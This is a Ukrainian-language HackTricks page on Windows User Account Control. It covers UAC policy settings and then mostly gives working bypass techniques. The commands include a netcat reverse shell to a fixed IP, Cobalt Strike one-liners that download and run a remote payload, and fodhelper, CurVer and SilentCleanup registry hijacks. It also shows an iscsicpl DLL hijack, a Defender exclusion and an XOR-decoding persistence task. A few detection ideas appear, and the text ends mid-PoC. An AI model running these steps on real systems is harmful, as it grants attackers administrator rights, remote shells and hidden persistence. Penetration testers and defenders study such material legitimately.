# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка вмикає **запит підтвердження для дій із підвищеними правами**. Програми мають різні рівні `integrity`, і програма з **високим рівнем** може виконувати завдання, які **потенційно можуть поставити систему під загрозу**. Коли UAC увімкнено, програми та завдання завжди **запускаються в контексті безпеки облікового запису без прав адміністратора**, якщо адміністратор явно не дозволить цим програмам/завданням отримати доступ до системи на рівні адміністратора. Це функція зручності, яка захищає адміністраторів від ненавмисних змін, але не вважається межею безпеки.<sup>[[2]](#references)</sup>

Докладніше про рівні integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Коли UAC активний, користувач-адміністратор отримує 2 токени: токен стандартного користувача для виконання звичайних дій із середнім рівнем integrity та токен із привілеями адміністратора.

На цій [сторінці](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) детально описано принцип роботи UAC, зокрема процес входу, взаємодію з користувачем та архітектуру UAC.<sup>[[2]](#references)</sup> Адміністратори можуть використовувати політики безпеки для налаштування роботи UAC відповідно до вимог своєї організації на локальному рівні (за допомогою secpol.msc) або налаштовувати їх і розгортати через Group Policy Objects (GPO) у середовищі домену Active Directory. Різні параметри детально описано [тут](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Для UAC можна налаштувати 10 параметрів Group Policy. У наведеній нижче таблиці містяться додаткові відомості:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Політики встановлення програмного забезпечення у Windows

**локальні політики безпеки** ("secpol.msc" у більшості систем) за замовчуванням налаштовані так, щоб **забороняти користувачам без прав адміністратора виконувати встановлення програмного забезпечення**. Це означає, що навіть якщо користувач без прав адміністратора може завантажити інсталятор вашого програмного забезпечення, він не зможе запустити його без облікового запису адміністратора.

### Registry Keys to Force UAC to Ask for Elevation

Будучи стандартним користувачем без прав адміністратора, ви можете переконатися, що **UAC запитуватиме облікові дані** стандартного облікового запису, коли той намагається виконати певні дії. Для цього потрібно змінити певні **registry keys**, для чого необхідні права адміністратора, якщо не існує **UAC bypass** або зловмисник уже не увійшов до системи як адміністратор.

Навіть якщо користувач входить до групи **Administrators**, ці зміни змушують користувача **повторно ввести облікові дані свого облікового запису** для виконання адміністративних дій.

**На практиці це корисно лише тоді, коли ви вже маєте підвищений токен, UAC bypass або неправильну конфігурацію, яка дає змогу змінювати ці ключі; в іншому разі сам запис до реєстру буде заблоковано.**

Потрібно змінити такі registry keys і записи (значення за замовчуванням наведено в дужках):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Це також можна зробити вручну за допомогою інструмента Local Security Policy. Після внесення змін під час адміністративних операцій користувачу буде запропоновано повторно ввести свої облікові дані.

### Примітка

**User Account Control не є межею безпеки.** Тому стандартні користувачі не можуть вийти за межі своїх облікових записів і отримати права адміністратора без exploit для локального підвищення привілеїв.

### Запросити у користувача «повний доступ до комп’ютера»
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode використовує перевірки цілісності, щоб запобігти доступу процесів із високим рівнем цілісності (наприклад, веббраузерів) до даних із низьким рівнем цілісності (наприклад, до папки тимчасових файлів Internet). Це реалізовано шляхом запуску браузера з токеном низького рівня цілісності. Коли браузер намагається отримати доступ до даних, збережених у зоні низького рівня цілісності, операційна система перевіряє рівень цілісності процесу та відповідно дозволяє доступ. Ця функція допомагає запобігати атакам віддаленого виконання коду, які намагаються отримати доступ до конфіденційних даних у системі.
- Коли користувач входить до Windows, система створює токен доступу, що містить список привілеїв користувача. Привілеї визначаються як сукупність прав і можливостей користувача. Токен також містить список облікових даних користувача — даних, які використовуються для автентифікації користувача на комп’ютері та доступу до ресурсів у мережі.

### Autoadminlogon

Щоб налаштувати автоматичний вхід до Windows певного користувача під час запуску, установіть **`AutoAdminLogon` registry key**. Це корисно для kiosk-середовищ або тестування. Використовуйте це лише в захищених системах, оскільки пароль буде доступний у реєстрі.

Установіть наведені нижче ключі за допомогою Registry Editor або `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Щоб повернути звичайну поведінку входу, установіть `AutoAdminLogon` у значення 0.

## UAC bypass

> [!TIP]
> Зверніть увагу: якщо у вас є графічний доступ до цілі, UAC bypass виконується дуже просто — достатньо натиснути «Yes», коли з’явиться запит UAC

UAC bypass потрібен у такій ситуації: **UAC активовано, ваш процес працює в контексті середнього рівня цілісності, а ваш користувач входить до групи адміністраторів**.

Важливо зазначити, що **обійти UAC набагато складніше, якщо встановлено найвищий рівень безпеки (Always), ніж якщо встановлено будь-який інший рівень (Default).**

### Fast triage from a medium-integrity shell

Перш ніж намагатися виконати bypass, переконайтеся, що ви перебуваєте в потрібному сценарії, і зіставте збірку хоста з відомими робочими методами:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Практичні примітки:
- Якщо `EnableLUA=0`, bypass не потрібен: будь-який токен адміністратора може безпосередньо запросити високий рівень цілісності.
- `ConsentPromptBehaviorAdmin=2` або `5` — поширений сценарій для auto-elevate / COM-based bypasses.
- `Always Notify` підвищує вимоги, але все одно слід тестувати точну збірку, а не припускати невдачу: UACME досі відстежує деякі методи, сумісні з `AlwaysNotify`, у сучасних збірках Windows.<sup>[[3]](#references)</sup>

### UAC вимкнено

Якщо UAC уже вимкнено (`ConsentPromptBehaviorAdmin` має значення **`0`**), можна **запустити reverse shell із привілеями адміністратора** (високий рівень цілісності), використовуючи щось на кшталт:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass із дублюванням токена

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + повторно використовуваний об'єкт налагодження

Інтерфейс local RPC AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` може створювати процес із увімкненим налагодженням. Процеси, створені налагоджувачем в одному потоці, спільно використовують debug object цього потоку; подія налагодження створення містить дескриптор процесу з повним доступом, навіть якщо сам результат RPC надає лише обмежений доступ. Це перетворює повторне використання debug object на примітив UAC для учасника групи Administrators із середнім рівнем цілісності.<sup>[[11]](#references)[[12]](#references)</sup>

Практичний ланцюжок має такий вигляд:<sup>[[11]](#references)[[12]](#references)</sup>

1. Викликати метод local RPC (безпосередньо або через `NdrAsyncClientCall`), щоб створити незпідвищений sacrificial process з увімкненим налагодженням.
2. Запросити `ProcessDebugObjectHandle` за допомогою `NtQueryInformationProcess`, від'єднати його через `NtRemoveProcessDebug`, зберегти об'єкт і завершити sacrificial process.
3. Використати той самий інтерфейс RPC для створення довіреного auto-elevated process, а потім пов'язати збережений об'єкт із поточним потоком через `DbgUiSetThreadDebugObject`.
4. Викликати `WaitForDebugEvent` і отримати дескриптор процесу `CREATE_PROCESS_DEBUG_EVENT`; дублювати його через `NtDuplicateObject` перед продовженням.
5. Передати дубльований дескриптор у `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` і запустити payload із розширеною структурою startup-info. Це одночасно повторно використовує контекст підвищеного процесу та надає дочірньому процесу довіроподібний зв'язок із батьківським процесом.

Полюйте на коротку послідовність, а не лише на auto-elevated binary: створення процесу через local AppInfo RPC, запити `ProcessDebugObjectHandle`, від'єднання/повторне приєднання налагоджувача, негайну подію налагодження створення, дублювання дескриптора та дочірній процес, чий зафіксований батьківський процес не відповідає процесу, що виконав API створення.<sup>[[12]](#references)</sup>

### **Дуже** базовий UAC "bypass" (повний доступ до файлової системи)

Якщо у вас є shell користувача, який входить до групи Administrators, ви можете **підключити спільний ресурс C$** через SMB (файлову систему) локально як новий диск і отримаєте **доступ до всього в файловій системі** (навіть до домашньої папки Administrator).

> [!WARNING]
> **Схоже, цей трюк більше не працює**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Обхід UAC за допомогою Cobalt Strike

Техніки Cobalt Strike працюватимуть лише в тому випадку, якщо для UAC не встановлено максимальний рівень безпеки
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** і **Metasploit** також мають кілька модулів для **bypass** **UAC**.

### Підвищені COM-інтерфейси (`ICMLuaUtil` / `CMSTPLUA`)

Автоматично підвищені COM-об'єкти залишаються практичною поверхнею UAC у сучасних збірках. `ICMLuaUtil` і надалі відстежується UACME як такий, що працює в актуальних гілках Windows, а offensive tooling продовжує адаптувати `CMSTPLUA`, поєднуючи процес інтерактивного робочого столу, 64-бітне виконання, а іноді й masquerading PEB/процесу перед викликом COM Elevation Moniker.<sup>[[3]](#references)</sup>

Практичні поради:
- Віддавайте перевагу **64-бітному** процесу в **інтерактивному сеансі** користувача (зазвичай `explorer.exe` або його дочірньому процесу).
- Якщо raw shell не працює, повторіть спробу з BOF / реалізації UACME замість наївної обгортки `CreateProcess`.
- Очікуйте, що дочірнє виконання відбуватиметься в **окремому підвищеному процесі**; багато BOF не підвищують поточний beacon безпосередньо.

### KRBUACBypass

Документація та tool у [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) — це набір технік UAC bypass. Скомпілюйте його за допомогою Visual Studio або MSBuild; під час збірки створюється кілька виконуваних файлів (наприклад, `Source\Akagi\output\x64\Debug\Akagi.exe`), тому виберіть метод, що відповідає цільовій збірці.<sup>[[3]](#references)</sup>\
Будьте обережні: деякі bypass запускають видимі програми або запити, які можуть попередити користувача.<sup>[[3]](#references)</sup>

UACME містить **версію збірки, починаючи з якої кожна техніка почала працювати**.<sup>[[3]](#references)</sup> Ви можете знайти техніку, яка впливає на ваші версії:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Також за допомогою [цієї](https://en.wikipedia.org/wiki/Windows_10_version_history) сторінки можна визначити Windows release `1607` за версіями build.

Практичний робочий процес полягає в тому, щоб спочатку **оцінити build хоста**, і лише потім застосувати відповідний метод:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` швидко порівнює локальну збірку з відомими методами UAC, що дає змогу швидко відкидати непрацюючі PoC.<sup>[[4]](#references)</sup>
- `UACME` залишається найкращим публічним каталогом для зіставлення bypass із точною збіркою. У версії 3.7.1 додано методи 83–85, тоді як у попередньому релізі наявні методи було повторно протестовано на **Windows 11 25H2**; перевіряйте таблицю методів і release notes, а не припускайте, що старий PoC і досі працює без змін.<sup>[[3]](#references)[[9]](#references)</sup>

### WNF/UIAccess chains із підтримкою Always Notify (UACME 3.7.1)

`Always Notify` не усуває кожен UAC bypass. UACME 3.7.1 реалізує три нові x64-методи, які поєднують контрольований користувачем стан середовища/протоколу з поведінкою elevated scheduled task або UIAccess, і позначає всі їх як `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** перенаправити `SystemRoot`, щоб WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` змусив elevated `taskhostw.exe` виконати side-load `unifiedconsent.dll`. UACME відстежує цей метод починаючи зі збірки Windows 10 19041.
- **84 — TabTip:** використати той самий primitive змінної середовища проти UIAccess `TabTip.exe`, який залежно від збірки завантажує `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` або `rsaenh.dll`, а потім виконати pivot із отриманого UIAccess-контексту з високою цілісністю. UACME відстежує цей метод починаючи з Windows 8.1 / Server 2016.
- **85 — Narrator:** перехопити per-user протокол `feedback-hub`, керувати Narrator за допомогою `Alt+CapsLock+F`, а потім запустити доступну для запису копію `osk.exe`, яка виконує side-load `OskSupport.dll`. Для цього потрібен інтерактивний desktop; метод відстежується починаючи з Windows 10 1809 / Server 2019.

Після створення payload units і Akagi, як описано в UACME, викличте відповідний номер методу (необов’язкова команда за замовчуванням — `cmd.exe`):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Методи 84 і 85 залежать від UIAccess/взаємодії з робочим столом, тому не очікуйте, що вони працюватимуть без змін із Session 0 або з non-interactive service shell. Усі три змінюють стан середовища/протоколу та розміщують DLL; перевірте реалізацію й видаліть ці артефакти після тестування.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Довірений binary `fodhelper.exe` автоматично підвищує рівень привілеїв у сучасних Windows. Під час запуску він запитує наведений нижче per-user registry path, не перевіряючи verb `DelegateExecute`. Розміщення там команди дає змогу процесу з Medium Integrity (якщо користувач входить до Administrators) породити процес із High Integrity без запиту UAC.

Registry path, який запитує fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Кроки PowerShell (встановіть свій payload, потім виконайте trigger)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Примітки:
- Працює, коли поточний користувач є членом Administrators, а рівень UAC встановлено за замовчуванням/у поблажливому режимі (не Always Notify із додатковими обмеженнями).
- Використовуйте шлях `sysnative`, щоб запустити 64-бітний PowerShell із 32-бітного процесу в 64-бітній Windows.
- Payload може бути будь-якою командою (PowerShell, cmd або шляхом до EXE). Для прихованості уникайте UI, що запитують підтвердження.

#### Варіант hijack розширення CurVer (лише HKCU)

Нещодавні зразки, що зловживають `fodhelper.exe`, обходяться без `DelegateExecute` і натомість **перенаправляють ProgID `ms-settings`** через значення `CurVer` для поточного користувача. Автоматично підвищуваний binary усе ще шукає handler у `HKCU`, тому для розміщення ключів admin token не потрібен:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Після підвищення привілеїв malware зазвичай **вимикає майбутні запити** шляхом встановлення `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` у значення `0`, після чого виконує додаткове ухилення від захисту (наприклад, `Add-MpPreference -ExclusionPath C:\ProgramData`) і відтворює persistence для запуску з високою цілісністю. Типове завдання persistence зберігає на диску **XOR-зашифрований PowerShell script** і щогодини декодує та виконує його в пам’яті:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Цей варіант також очищає dropper і залишає лише staged payloads, тому виявлення залежить від моніторингу **`CurVer` hijack**, підміни `ConsentPromptBehaviorAdmin`, створення виключення Defender або scheduled tasks, які розшифровують PowerShell у пам’яті.<sup>[[5]](#references)</sup>

### Обхід UAC через завдання `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` запускає `cleanmgr.exe` з найвищими привілеями та розгортає `%windir%` із середовища користувача. Якщо ви контролюєте `HKCU\Environment\windir`, можна перенаправити це розгортання на довільну команду й отримати високий рівень цілісності без діалогу підтвердження.<sup>[[8]](#references)</sup> Цей метод і надалі варто тестувати в нових збірках, оскільки UACME зберігає техніку активною, а нещодавнє відстеження проблем показує, що для Windows 11 24H2 можуть знадобитися лише незначні зміни в quoting.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Якщо завдання цитує шлях у цій збірці, повторіть спробу з payload, що закінчується лапкою (наприклад, `cmd.exe"`). Завжди очищайте `HKCU\Environment\windir` після тестування.

#### More UAC bypass

Багато класичних UAC bypass, які зловживають UI-процесами, COM-об'єктами або взаємодією з робочим столом, потребують **повної інтерактивної сесії** з жертвою; звичайного shell через `nc.exe` або service, запущеного в **Session 0**, часто недостатньо.

Часто це можна вирішити за допомогою сесії **meterpreter**. Виконайте міграцію до **process**, у якого значення **Session** дорівнює **1**:

![Спрямуйте ms-settings на custom extension (.thm) і зіставте це extension з нашим payload - More UAC bypass: Це можна зробити за допомогою сесії meterpreter. Виконайте міграцію до process, у якого значення Session...](<../../images/image (863).png>)

(_explorer.exe_ має працювати)

### UAC Bypass with GUI

Якщо у вас є доступ до **GUI**, ви можете просто прийняти запит UAC, коли він з'явиться; технічний bypass насправді не потрібен. Тому отримання GUI-сесії часто достатнє, щоб обійти практичні незручності, які створює UAC.

Крім того, якщо ви отримали GUI-сесію, якою хтось користувався (потенційно через RDP), там можуть працювати **деякі tools від імені administrator**, з яких можна безпосередньо **запустити** **cmd**, наприклад **як admin**, без повторного запиту UAC, як у [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути дещо більш **stealthy**.

### Noisy brute-force UAC bypass

Якщо шум прийнятний, tool на кшталт [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) може повторно запитувати підвищення привілеїв, доки користувач його не прийме.

### Your own bypass - Basic UAC bypass methodology

Якщо переглянути **UACME**, ви помітите, що **багато UAC bypass зловживають DLL hijacking** (часто змушуючи elevated binary завантажувати DLL, контрольовану attacker, із writable path). [Прочитайте це, щоб дізнатися, як знаходити вразливість DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Знайдіть binary, який виконує **autoelevate** (перевірте, що під час виконання він запускається з high integrity level).
2. За допомогою procmon знайдіть події "**NAME NOT FOUND**", які можуть бути вразливими до **DLL Hijacking**.
3. Імовірно, вам потрібно буде **записати** DLL у деякі **protected paths** (наприклад, C:\Windows\System32), куди у вас немає дозволу на запис. Це можна обійти за допомогою:
1. **wusa.exe**: Windows 7, 8 і 8.1. Він дає змогу видобути вміст CAB-файлу в protected paths (оскільки цей tool виконується з high integrity level).
2. **IFileOperation**: Windows 10.
4. Підготуйте **script**, який скопіює вашу DLL у protected path і запустить вразливий та autoelevated binary.

### Another UAC bypass technique

Полягає в перевірці того, чи намагається **autoElevated binary** прочитати з **registry** **ім'я/шлях** **binary** або **command**, який потрібно **виконати** (це цікавіше, якщо binary шукає цю інформацію в **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-бітний `C:\Windows\SysWOW64\iscsicpl.exe` — це **auto-elevated** binary, яким можна зловживати для завантаження `iscsiexe.dll` за search order. Якщо ви можете розмістити malicious `iscsiexe.dll` у **user-writable** folder, а потім змінити `PATH` поточного користувача (наприклад, через `HKCU\Environment\Path`), щоб цей folder перевірявся, Windows може завантажити attacker DLL у процес elevated `iscsicpl.exe` **без відображення запиту UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Практичні примітки:
- Це корисно, коли поточний користувач входить до **Administrators**, але працює з **Medium Integrity** через UAC.
- Для цього bypass важливою є копія **SysWOW64**. Розглядайте копію **System32** як окремий binary і перевіряйте її поведінку незалежно.
- Цей primitive є поєднанням **auto-elevation** і **DLL search-order hijacking**, тому той самий workflow у ProcMon, який використовується для інших UAC bypass, корисний для перевірки завантаження відсутньої DLL.

Мінімальний flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ідеї для виявлення:
- Створюйте сповіщення про `reg add` / записи до реєстру в `HKCU\Environment\Path`, за якими одразу запускається `C:\Windows\SysWOW64\iscsicpl.exe`.
- Шукайте `iscsiexe.dll` у **контрольованих користувачем** розташуваннях, таких як `%TEMP%` або `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Встановлюйте кореляцію між запуском `iscsicpl.exe` та неочікуваними дочірніми процесами або завантаженням DLL із директорій поза стандартними директоріями Windows.

### Новіші дослідження, які варто перевірити окремо

У деяких ланцюжках після 2024 року більше не використовуються класичні hijack-атаки реєстру `HKCU\Software\Classes`. Наприклад, poisoning кешу activation context може поєднувати **перенаправлення диска** та **DLL redirection**, щоб перейти від середньої до високої цілісності через довірені UI / auto-elevated бінарні файли, такі як `ctfmon.exe`, а згодом і такі цілі, як `fodhelper.exe`. Замість дублювання великого PoC тут перевірте компактні приклади payload у:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack літери диска Administrator Protection (preview) через DOS device map для окремої сесії входу

> [!NOTE]
> Станом на серпень 2026 року Microsoft досі описує Administrator Protection як **Insider preview**: розгортання у жовтні 2025 року було скасовано, і його планують відновити пізніше. Перед тестуванням цих ланцюжків переконайтеся, що **Admin Approval Mode with Administrator protection** фактично увімкнено, а пристрій перезавантажено; сам рядок версії 25H2 у стандартній системі не доводить, що функція активна.<sup>[[10]](#references)</sup>

Щоб ознайомитися з повною поверхнею атак `RAiLaunchAdminProcess` / UIAccess у preview-збірках Windows 11 25H2, перейдіть на спеціальну сторінку:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” використовує shadow-admin токени з картами `\Sessions\0\DosDevices/<LUID>` для окремих сесій. Директорія ліниво створюється `SeGetTokenDeviceMap` під час першого розв’язання `\??`. Якщо attacker impersonates shadow-admin token лише на рівні **SecurityIdentification**, директорія створюється з attacker як **owner** (успадковує `CREATOR OWNER`), що дає змогу створювати посилання на літери дисків, які мають пріоритет над `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Кроки:**

1. Із сесії з низькими привілеями викличте `RAiProcessRunOnce`, щоб запустити shadow-admin `runonce.exe` без prompt.
2. Дублюйте його primary token у **identification** token і impersonate його під час відкриття `\??`, щоб примусово створити `\Sessions\0\DosDevices/<LUID>` у власності attacker.
3. Створіть там symlink `C:`, що вказує на контрольоване attacker сховище; подальші доступи до файлової системи в цій сесії розв’язуватимуть `C:` до шляху attacker, уможливлюючи DLL/file hijack без prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
